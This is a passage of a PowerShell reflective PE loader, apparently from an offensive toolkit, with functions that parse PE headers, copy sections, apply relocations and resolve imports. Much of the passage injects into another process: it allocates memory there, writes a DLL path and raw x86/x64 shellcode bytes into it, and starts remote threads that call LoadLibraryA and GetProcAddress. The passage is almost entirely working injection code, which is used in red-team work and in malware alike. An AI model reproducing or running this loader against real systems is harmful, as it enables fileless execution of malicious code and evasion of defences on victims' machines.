        }
        
        $PEInfo = New-Object System.Object
        
        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $PEInfo
    }
    
    
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            
            
            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            #Write FunctionName to memory (will be used in GetProcAddress)
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
        
        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        
        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        
        
        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        
        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        
        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        
        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            #    so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        
            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        
        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {           
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }               

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                
                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    #   and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }
                    
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
